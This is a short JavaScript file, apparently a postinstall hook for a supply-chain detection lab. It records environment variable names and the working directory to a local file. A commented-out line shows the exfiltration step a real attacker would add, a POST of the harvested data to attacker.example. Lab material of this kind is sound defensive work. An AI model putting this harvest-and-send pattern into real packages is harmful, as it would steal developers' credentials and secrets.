// SIMULATED supply-chain payload — for detection testing only.
// A real attacker would exfiltrate env vars / credentials here.
// This version only writes a local marker file. It makes no network calls.

const fs = require('fs');

const harvested = {
    note: 'This is a simulated exfiltration target, not a real one.',
    env_keys_present: Object.keys(process.env),   // names only, not values
    cwd: process.cwd(),
    timestamp: new Date().toISOString()
};

fs.writeFileSync('.supply-chain-lab-evidence.json', JSON.stringify(harvested, null, 2));
console.log('[lab] postinstall hook executed — see .supply-chain-lab-evidence.json');

// A real attacker's next line would look like this (commented out, never run):
// require('https').request('https://attacker.example/collect', { method: 'POST' }, ...).end(JSON.stringify(harvested));